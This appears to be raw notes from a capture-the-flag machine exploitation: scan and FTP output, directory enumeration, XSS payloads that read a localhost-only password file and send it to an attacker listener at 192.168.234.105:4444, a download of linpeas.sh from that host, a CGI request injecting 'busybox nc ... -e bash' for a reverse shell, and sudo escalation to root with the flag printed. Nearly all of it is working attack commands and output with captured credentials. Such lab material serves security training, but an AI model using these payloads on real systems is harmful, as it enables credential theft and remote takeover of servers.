```
nmap -sS -sV -sC 10.48.172.29                                           
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-07 09:25 -0400
Nmap scan report for 10.48.172.29
Host is up (0.045s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             318 Mar 14  2023 update.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.234.105
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 47:71:2b:90:7d:89:b8:e9:b4:6a:76:c1:50:49:43:cf (RSA)
|   256 cb:29:97:dc:fd:85:d9:ea:f8:84:98:0b:66:10:5e:6f (ECDSA)
|_  256 12:3f:38:92:a7:ba:7f:da:a7:18:4f:0d:ff:56:c1:1f (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Welcome!!
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.73 seconds
                                                                 
```

```
ftp 10.48.172.29 
Connected to 10.48.172.29.
220 (vsFTPd 3.0.3)
Name (10.48.172.29:kali): Anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||23787|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             318 Mar 14  2023 update.txt
226 Directory send OK.
ftp> cat update.txt
?Invalid command.
ftp> get update.txt
local: update.txt remote: update.txt
229 Entering Extended Passive Mode (|||62551|)
150 Opening BINARY mode data connection for update.txt (318 bytes).
100% |*****************************************************************************************************************|   318        4.90 KiB/s    00:00 ETA
226 Transfer complete.
318 bytes received in 00:00 (2.53 KiB/s)
ftp> 

```


```
cat update.txt      
Hey I just removed the old user mike because that account was compromised and for any of you who wants the creds of new account visit 127.0.0.1/dir/pass.txt and don't worry this file is only accessible by localhost(127.0.0.1), so nobody else can view it except me or people with access to the common account. 
- admin

```

```
 gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://10.48.172.29 -x php
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.48.172.29
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.htaccess.php        (Status: 403) [Size: 277]
.htaccess            (Status: 403) [Size: 277]
.htpasswd            (Status: 403) [Size: 277]
.htpasswd.php        (Status: 403) [Size: 277]
assets               (Status: 301) [Size: 313] [--> http://10.48.172.29/assets/]
blog.php             (Status: 200) [Size: 3102]
cgi-bin/.php         (Status: 403) [Size: 277]
cgi-bin/             (Status: 403) [Size: 277]
config.php           (Status: 200) [Size: 0]
dir                  (Status: 403) [Size: 277]
index.php            (Status: 200) [Size: 563]
login.php            (Status: 200) [Size: 523]
logout.php           (Status: 302) [Size: 0] [--> login.php]
register.php         (Status: 200) [Size: 643]
server-status        (Status: 403) [Size: 277]
Progress: 40938 / 40938 (100.00%)

```



<script>fetch("http://127.0.0.1/dir/pass.txt").then(r => r.text()).then(t => fetch("http://192.168.234.105:4444?q="+t,{mode:"no-cors"}))</script>

<script> fetch("http://127.0.0.1/dir/pass.txt") .then(response => response.text()) .then(data => { fetch("http://192.168.234.105:4444?q=" + encodeURIComponent(data), { mode: "no-cors" }); }); </script>

```
cat script.js       

fetch('http://127.0.0.1/dir/pass.txt')
.then(res => res.text())
.then(html => {
const encodedHTML = encodeURIComponent(html);
const url='http://10.9.2.142/data?html=${encodedHTML}';
fetch(url);
});

```

```
python3 -m http.server 4444
Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
10.49.154.64 - - [07/Jun/2026 14:11:00] "GET /?q=jack:WhyIsMyPasswordSoStrongIDK HTTP/1.1" 200 -
10.49.154.64 - - [07/Jun/2026 14:12:00] "GET /?q=jack:WhyIsMyPasswordSoStrongIDK HTTP/1.1" 200 -
10.49.154.64 - - [07/Jun/2026 14:13:00] "GET /?q=jack:WhyIsMyPasswordSoStrongIDK HTTP/1.1" 200 -



```

***port=60564***

cd /tmp wget http://192.168.234.105:8080/linpeas.sh chmod +x linpeas.sh ./linpeas.sh

```
jack@ubuntu:/tmp$ curl -kv "https://127.0.0.1:41312/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=busybox%20nc%20192.168.234.105%204444%20-e%20bash"
*   Trying 127.0.0.1:41312...
* TCP_NODELAY set
* Connected to 127.0.0.1 (127.0.0.1) port 41312 (#0)
* ALPN, offering h2
* ALPN, offering http/1.1
* successfully set certificate verify locations:
*   CAfile: /etc/ssl/certs/ca-certificates.crt
  CApath: /etc/ssl/certs
* TLSv1.3 (OUT), TLS handshake, Client hello (1):
* TLSv1.3 (IN), TLS handshake, Server hello (2):
* TLSv1.2 (IN), TLS handshake, Certificate (11):
* TLSv1.2 (IN), TLS handshake, Server finished (14):
* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):
* TLSv1.2 (OUT), TLS change cipher, Change cipher spec (1):
* TLSv1.2 (OUT), TLS handshake, Finished (20):
* TLSv1.2 (IN), TLS handshake, Finished (20):
* SSL connection using TLSv1.2 / AES256-SHA
* ALPN, server accepted to use http/1.1
* Server certificate:
*  subject: C=AU; ST= ; L= ; O= ; OU= ; CN= boring.box; emailAddress= 
*  start date: Feb 25 19:06:50 2022 GMT
*  expire date: Feb 25 19:06:50 2023 GMT
*  issuer: C=AU; ST= ; L= ; O= ; OU= ; CN= boring.box; emailAddress= 
*  SSL certificate verify result: self signed certificate (18), continuing anyway.
> GET /cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=busybox%20nc%20192.168.234.105%204444%20-e%20bash HTTP/1.1
> Host: 127.0.0.1:41312
> User-Agent: curl/7.68.0
> Accept: */*
> 


```


```
nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.234.105] from (UNKNOWN) [10.49.154.64] 33710
id
uid=33(www-data) gid=1003(h4ck3d) groups=1003(h4ck3d)
pwd
/usr/lib/cgi-bin
sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: ALL
sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: ALL
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: ALL
                                                      
```

```
nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.234.105] from (UNKNOWN) [10.49.154.64] 32818
sudo bash
cat /root/root.txt
4dbe2259ae53846441cc2479b5475c72


```

